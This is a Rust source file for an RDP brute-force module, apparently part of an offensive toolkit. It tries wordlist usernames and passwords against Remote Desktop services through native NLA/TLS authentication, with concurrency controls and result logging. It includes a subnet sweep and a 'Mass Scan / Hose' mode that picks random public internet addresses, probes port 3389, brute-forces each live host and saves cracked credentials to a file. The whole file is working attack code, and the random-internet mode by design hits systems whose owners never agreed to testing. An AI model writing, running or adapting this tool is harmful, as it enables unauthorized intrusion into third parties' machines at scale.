use anyhow::{anyhow, Result, Context};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    net::{IpAddr, SocketAddr},
    path::Path,
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering},
    time::Instant,
};
use tokio::{
    fs::OpenOptions,
    io::AsyncWriteExt,
    net::TcpStream,
    sync::{Mutex, Semaphore},
    time::{sleep, Duration, timeout},
};
use crate::native::rdp as rdp_native;

use crate::utils::{
    prompt_default,
    load_lines, get_filename_in_current_dir,
    cfg_prompt_yes_no, cfg_prompt_port, cfg_prompt_int_range,
    cfg_prompt_existing_file,
    cfg_prompt_output_file,
};
use crate::modules::creds::utils::{is_subnet_target, parse_subnet, subnet_host_count, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};

const PROGRESS_INTERVAL_SECS: u64 = 2;
const MAX_MEMORY_LOAD_SIZE: u64 = 150 * 1024 * 1024; // 150 MB
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
const STATE_FILE: &str = "rdp_brute_hose_state.log";

// Hardcoded exclusions for mass scan
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    "8.8.8.8/32", "8.8.4.4/32"
];

/// RDP-specific error types for better classification
#[derive(Debug, Clone)]
enum RdpError {
    ConnectionFailed,
    ProtocolError,
}

impl std::fmt::Display for RdpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RdpError::ConnectionFailed => write!(f, "Connection failed"),
            RdpError::ProtocolError => write!(f, "Protocol error"),
        }
    }
}

/// RDP Security Level for authentication
#[derive(Debug, Clone, Copy)]
enum RdpSecurityLevel {
    Auto,
    Nla,
    Tls,
    Rdp,
    Negotiate,
}

impl RdpSecurityLevel {
    fn as_protocol_flags(&self) -> u32 {
        match self {
            RdpSecurityLevel::Auto => rdp_native::PROTO_HYBRID | rdp_native::PROTO_SSL,
            RdpSecurityLevel::Nla => rdp_native::PROTO_HYBRID,
            RdpSecurityLevel::Tls => rdp_native::PROTO_SSL,
            RdpSecurityLevel::Rdp => rdp_native::PROTO_RDP,
            RdpSecurityLevel::Negotiate => rdp_native::PROTO_HYBRID | rdp_native::PROTO_SSL | rdp_native::PROTO_RDP,
        }
    }

    fn prompt_selection() -> Result<Self> {
        // Check config for pre-set security level
        let config = crate::config::get_module_config();
        if let Some(val) = config.custom_prompts.get("security_level") {
            match val.trim() {
                "1" | "auto" => return Ok(RdpSecurityLevel::Auto),
                "2" | "nla" => return Ok(RdpSecurityLevel::Nla),
                "3" | "tls" => return Ok(RdpSecurityLevel::Tls),
                "4" | "rdp" => return Ok(RdpSecurityLevel::Rdp),
                "5" | "negotiate" => return Ok(RdpSecurityLevel::Negotiate),
                _ => {} // fall through to interactive
            }
        }

        println!("\nRDP Security Level Options:");
        println!("  1. Auto (let client negotiate)");
        println!("  2. NLA (Network Level Authentication)");
        println!("  3. TLS (Transport Layer Security)");
        println!("  4. RDP (Standard RDP encryption)");
        println!("  5. Negotiate (try all methods)");

        loop {
            let input = prompt_default("Security level", "1")?;
            match input.trim() {
                "1" => return Ok(RdpSecurityLevel::Auto),
                "2" => return Ok(RdpSecurityLevel::Nla),
                "3" => return Ok(RdpSecurityLevel::Tls),
                "4" => return Ok(RdpSecurityLevel::Rdp),
                "5" => return Ok(RdpSecurityLevel::Negotiate),
                _ => println!("{}", "Invalid choice. Please select 1-5.".yellow()),
            }
        }
    }
}

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   RDP Brute Force Module                                  ║".cyan());
    println!("{}", "║   Remote Desktop Protocol Credential Testing              ║".cyan());
    println!("{}", "║   Native TCP + TLS + CredSSP/NTLM Authentication         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // Check for Mass Scan Mode
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    if is_mass_scan {
        println!("{}", format!("[*] Target: {}", target).cyan());
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    if is_subnet_target(target) {
        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
        return run_subnet_scan(target).await;
    }

    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = cfg_prompt_port("port", "RDP Port", 3389)?;

    let usernames_file_path = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;

    let passwords_file_path = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 10000)? as usize;

    let timeout_secs = cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 10, 1, 300)? as u64;

    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true)?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true)?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file name", "rdp_results.txt")?)
    } else {
        None
    };

    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every password with every user)", false)?;
    let security_level = RdpSecurityLevel::prompt_selection()?;

    let addr = format_socket_address(target, port);

    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    println!("\n[*] Starting brute-force on {}", addr);
    println!("[*] Timeout: {} seconds", timeout_secs);

    // Count lines for display
    let user_count = load_lines(&usernames_file_path)?.len();
    if user_count == 0 {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", user_count);

    let password_count = load_lines(&passwords_file_path)?.len();
    if password_count == 0 {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", password_count);

    let total_attempts = if combo_mode { user_count * password_count } else { password_count };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    // Execute appropriate mode
    if combo_mode {
        // Check if password file is too large for memory loading
        let use_streaming = should_use_streaming(&passwords_file_path)?;
        let pass_file_size = std::fs::metadata(&passwords_file_path)?.len();

        if use_streaming {
            println!("{}", format!("[*] Password file is {} (>{}), using streaming mode to save memory",
                format_file_size(pass_file_size), format_file_size(MAX_MEMORY_LOAD_SIZE)).yellow());
            println!("{}", "[*] Streaming mode: processing users sequentially to conserve memory".yellow());

            run_combo_mode_streaming(
                &addr, &usernames_file_path, &passwords_file_path,
                concurrency, timeout_secs, stop_on_success, verbose, security_level,
                found_credentials.clone(), stop_signal.clone(), stats.clone()
            ).await?;
        } else {
            println!("{}", format!("[*] Password file is {}, using memory-loaded mode for optimal performance",
                format_file_size(pass_file_size)).cyan());

            run_combo_mode_memory(
                &addr, &usernames_file_path, &passwords_file_path,
                concurrency, timeout_secs, stop_on_success, verbose, security_level,
                found_credentials.clone(), stop_signal.clone(), stats.clone()
            ).await?;
        }
    } else {
        // Sequential mode: cycle through users for each password
        run_sequential_mode(
            &addr, &usernames_file_path, &passwords_file_path,
            concurrency, timeout_secs, stop_on_success, verbose, security_level,
            found_credentials.clone(), stop_signal.clone(), stats.clone()
        ).await?;
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final();

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            match File::create(&filename).context(format!("Failed to create output file '{}'", filename.display())) {
                Ok(mut file) => {
                    for (host_addr, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host_addr, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file: {}", filename.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", filename.display());
                }
                Err(e) => {
                    eprintln!("[!] {}", e);
                }
            }
        }
    }
    drop(creds);

    Ok(())
}

/// Sequential mode: cycle through users for each password
async fn run_sequential_mode(
    addr: &str,
    usernames_file_path: &str,
    passwords_file_path: &str,
    concurrency: usize,
    timeout_secs: u64,
    stop_on_success: bool,
    verbose: bool,
    security_level: RdpSecurityLevel,
    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<Statistics>,
) -> Result<()> {
    let pass_file = File::open(passwords_file_path)?;
            let pass_reader = BufReader::new(pass_file);
            
    // Load users into memory for cycling
    let users = load_lines(usernames_file_path)?;
    if users.is_empty() {
        return Err(anyhow!("No valid users loaded"));
    }

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    for (i, pass_line) in pass_reader.lines().enumerate() {
                if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                    break;
                }
                
                let pass = match pass_line {
                    Ok(line) => line.trim().to_string(),
                    Err(_) => continue,
                };
                
                if pass.is_empty() {
                    continue;
                }

        let user = users[i % users.len()].clone();
        let addr_clone = addr.to_string();
                let pass_clone = pass.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let timeout_duration = Duration::from_secs(timeout_secs);

                tasks.push(tokio::spawn(async move {
            if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };

            if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

            match try_rdp_login(&addr_clone, &user, &pass_clone, timeout_duration, security_level).await {
                        Ok(true) => {
                    println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                    found.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                    if stop_on_success {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                    if verbose {
                        println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                    if verbose {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }

                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

                // Limit concurrent tasks
                if tasks.len() >= concurrency {
                    if let Some(res) = tasks.next().await {
                        if let Err(e) = res {
                    if verbose {
                        println!("\r{}", format!("[!] Task join error: {}", e).red());
                        }
                    }
                }
            }
        }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task join error: {}", e).red());
            }
        }
    }

    Ok(())
}

/// Combo mode using memory loading (for smaller password files)
async fn run_combo_mode_memory(
    addr: &str,
    usernames_file_path: &str,
    passwords_file_path: &str,
    concurrency: usize,
    timeout_secs: u64,
    stop_on_success: bool,
    verbose: bool,
    security_level: RdpSecurityLevel,
    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<Statistics>,
) -> Result<()> {
    let passwords = load_lines(passwords_file_path)?;
    let user_file = File::open(usernames_file_path)?;
    let user_reader = BufReader::new(user_file);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    for user_line in user_reader.lines() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }
            
        let user = match user_line {
                Ok(line) => line.trim().to_string(),
                Err(_) => continue,
            };
            
        if user.is_empty() {
                continue;
            }
            
        for pass in &passwords {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }

            if pass.is_empty() {
                continue;
            }

            let addr_clone = addr.to_string();
            let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let timeout_duration = Duration::from_secs(timeout_secs);

                tasks.push(tokio::spawn(async move {
                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };

                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
                        Ok(true) => {
                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                        if stop_on_success {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                        if verbose {
                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                        if verbose {
                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }

                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

            // Limit concurrent tasks
            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        if verbose {
                            println!("\r{}", format!("[!] Task error: {}", e).red());
                        }
                    }
                }
            }
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    Ok(())
}

/// Combo mode using streaming (for large password files to prevent memory exhaustion)
async fn run_combo_mode_streaming(
    addr: &str,
    usernames_file_path: &str,
    passwords_file_path: &str,
    concurrency: usize,
    timeout_secs: u64,
    stop_on_success: bool,
    verbose: bool,
    security_level: RdpSecurityLevel,
    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<Statistics>,
) -> Result<()> {
    let user_file = File::open(usernames_file_path)?;
    let user_reader = BufReader::new(user_file);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    for user_line in user_reader.lines() {
        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
        }

        let user = match user_line {
            Ok(line) => line.trim().to_string(),
            Err(_) => continue,
        };

        if user.is_empty() {
            continue;
        }

        let pass_file = File::open(passwords_file_path)?;
        let pass_reader = BufReader::new(pass_file);

        for pass_line in pass_reader.lines() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                            break;
                        }

            let pass = match pass_line {
                Ok(line) => line.trim().to_string(),
                Err(_) => continue,
            };

            if pass.is_empty() {
                continue;
            }

            let addr_clone = addr.to_string();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_credentials_clone = Arc::clone(&found_credentials);
            let stop_signal_clone = Arc::clone(&stop_signal);
            let semaphore_clone = Arc::clone(&semaphore);
            let stats_clone = Arc::clone(&stats);
            let timeout_duration = Duration::from_secs(timeout_secs);

            tasks.push(tokio::spawn(async move {
                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                    return;
                }

                let permit = match semaphore_clone.acquire_owned().await {
                    Ok(permit) => permit,
                    Err(_) => return,
                };

                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                    return;
                }

                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
                    Ok(true) => {
                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                        let mut found = found_credentials_clone.lock().await;
                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                        stats_clone.record_attempt(true, false);
                        if stop_on_success {
                            stop_signal_clone.store(true, Ordering::Relaxed);
                        }
                    }
                    Ok(false) => {
                        stats_clone.record_attempt(false, false);
                        if verbose {
                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                        }
                }
                Err(e) => {
                        stats_clone.record_attempt(false, true);
                        if verbose {
                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                        }
                    }
                }

                drop(permit);
                sleep(Duration::from_millis(10)).await;
            }));

            // Limit concurrent tasks
            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        if verbose {
                            println!("\r{}", format!("[!] Task error: {}", e).red());
                        }
                    }
                }
            }
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    Ok(())
}

/// Native RDP login via TCP + TLS + CredSSP/NTLM (no external tools needed)
async fn try_rdp_login(addr: &str, user: &str, pass: &str, timeout_duration: Duration, security_level: RdpSecurityLevel) -> Result<bool> {
    let protocols = security_level.as_protocol_flags();
    match rdp_native::try_login(addr, user, pass, timeout_duration, protocols).await {
        Ok(rdp_native::RdpLoginResult::Success) => Ok(true),
        Ok(rdp_native::RdpLoginResult::AuthFailed) => Ok(false),
        Ok(rdp_native::RdpLoginResult::ConnectionFailed(e)) => {
            Err(anyhow!("{}: {}", RdpError::ConnectionFailed, e))
        }
        Ok(rdp_native::RdpLoginResult::ProtocolError(e)) => {
            Err(anyhow!("{}: {}", RdpError::ProtocolError, e))
        }
        Err(e) => Err(e),
    }
}

fn should_use_streaming<P: AsRef<Path>>(path: P) -> Result<bool> {
    let metadata = std::fs::metadata(path.as_ref())
        .map_err(|e| anyhow!("Failed to get file metadata: {}", e))?;
    Ok(metadata.len() > MAX_MEMORY_LOAD_SIZE)
}

fn format_file_size(size: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB"];
    let mut size = size as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    format!("{:.1} {}", size, UNITS[unit_index])
}

fn format_socket_address(ip: &str, port: u16) -> String {
    let trimmed_ip = ip.trim_matches(|c| c == '[' || c == ']');
    if trimmed_ip.contains(':') && !trimmed_ip.contains("]:") {
        format!("[{}]:{}", trimmed_ip, port)
    } else {
        format!("{}:{}", trimmed_ip, port)
    }
}

// ============================================================================
// Mass Scan Implementation
// ============================================================================

async fn run_mass_scan(target: &str) -> Result<()> {
    let port: u16 = cfg_prompt_port("port", "RDP Port", 3389)?;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;

    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;

    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
    let output_file = cfg_prompt_output_file("output_file", "Output result file", "rdp_brute_mass_results.txt")?;
    let security_level = RdpSecurityLevel::prompt_selection()?;
    let timeout_secs: u64 = cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 10, 1, 300)? as u64;

    let use_exclusions = cfg_prompt_yes_no("use_exclusions", "Exclude reserved/private ranges?", true)?;

    let exclusion_subnets = if use_exclusions {
        let subs = parse_exclusions(EXCLUDED_RANGES);
        println!("{}", format!("[+] Loaded {} exclusion ranges", subs.len()).cyan());
        subs
    } else {
        Vec::new()
    };
    let exclusions = Arc::new(exclusion_subnets);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    let creds_pkg = Arc::new((users, passes));

    // Stats reporter
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} valid credentials found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        // Initialize state file
        OpenOptions::new().create(true).write(true).open(STATE_FILE).await?;

        println!("{}", "[*] Starting Random Internet RDP Scan...".green());
        loop {
            let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
            let exc = exclusions.clone();
            let cp = creds_pkg.clone();
            let sc = stats_checked.clone();
            let sf = stats_found.clone();
            let of = output_file.clone();

            tokio::spawn(async move {
                let ip = generate_random_public_ip(&exc);
                if !is_ip_checked(&ip, STATE_FILE).await {
                    mark_ip_checked(&ip, STATE_FILE).await;
                    mass_scan_host(ip, port, timeout_secs, security_level, cp, sf, of, verbose).await;
                }
                sc.fetch_add(1, Ordering::Relaxed);
                drop(permit);
            });
        }
    } else {
        // File Mode
        let content = match tokio::fs::read_to_string(target).await {
            Ok(c) => c,
            Err(e) => {
                println!("{}", format!("[!] Failed to read target file: {}", e).red());
                return Ok(());
            }
        };
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
            let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
            let cp = creds_pkg.clone();
            let sc = stats_checked.clone();
            let sf = stats_found.clone();
            let of = output_file.clone();

            if let Ok(ip) = ip_str.parse::<IpAddr>() {
                tokio::spawn(async move {
                    if !is_ip_checked(&ip, STATE_FILE).await {
                        mark_ip_checked(&ip, STATE_FILE).await;
                        mass_scan_host(ip, port, timeout_secs, security_level, cp, sf, of, verbose).await;
                    }
                    sc.fetch_add(1, Ordering::Relaxed);
                    drop(permit);
                });
            } else {
                drop(permit);
            }
        }
        // Wait for all tasks to complete
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }

    Ok(())
}

async fn run_subnet_scan(target: &str) -> Result<()> {
    let network = parse_subnet(target)?;
    let count = subnet_host_count(&network);
    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());

    let port: u16 = cfg_prompt_port("port", "RDP Port", 3389)?;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;
    if users.is_empty() || passes.is_empty() { return Err(anyhow!("Wordlists cannot be empty")); }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
    let timeout_secs = cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 10, 1, 300)? as u64;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
    let output_file = cfg_prompt_output_file("output_file", "Output result file", "rdp_subnet_results.txt")?;
    let security_level = RdpSecurityLevel::prompt_selection()?;

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));
    let creds_pkg = Arc::new((users, passes));
    let total = count;

    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
                s_checked.load(Ordering::Relaxed), total,
                s_found.load(Ordering::Relaxed).to_string().green().bold());
        }
    });

    for ip in network.iter() {
        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
        let cp = creds_pkg.clone();
        let sc = stats_checked.clone();
        let sf = stats_found.clone();
        let of = output_file.clone();

        tokio::spawn(async move {
            mass_scan_host(ip, port, timeout_secs, security_level, cp, sf, of, verbose).await;
            sc.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }

    for _ in 0..concurrency {
        let _ = semaphore.acquire().await.context("Semaphore")?;
    }

    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
        stats_checked.load(Ordering::Relaxed),
        stats_found.load(Ordering::Relaxed)).cyan().bold());
    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr,
    port: u16,
    timeout_secs: u64,
    security_level: RdpSecurityLevel,
    creds: Arc<(Vec<String>, Vec<String>)>,
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool,
) {
    let sa = SocketAddr::new(ip, port);

    // 1. Connection Check - verify port is open
    if timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(&sa)).await.is_err() {
        return;
    }

    let (users, passes) = &*creds;
    let addr = format_socket_address(&ip.to_string(), port);
    let timeout_duration = Duration::from_secs(timeout_secs);

    // 2. Brute force against this host
    for user in users {
        for pass in passes {
            match try_rdp_login(&addr, user, pass, timeout_duration, security_level).await {
                Ok(true) => {
                    let msg = format!("{}:{}:{}:{}", ip, port, user, pass);
                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                        let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
                    }
                    stats_found.fetch_add(1, Ordering::Relaxed);
                    return; // Stop after first success on this host
                }
                Ok(false) => {
                    if verbose {
                        println!("\r{}", format!("[-] {} -> {}:{}", addr, user, pass).dimmed());
                    }
                }
                Err(e) => {
                    let err = e.to_string().to_lowercase();
                    if err.contains("refused") || err.contains("timeout") || err.contains("reset") || err.contains("not found") {
                        return; // Host is dead or blocked
                    }
                }
            }
        }
    }
}
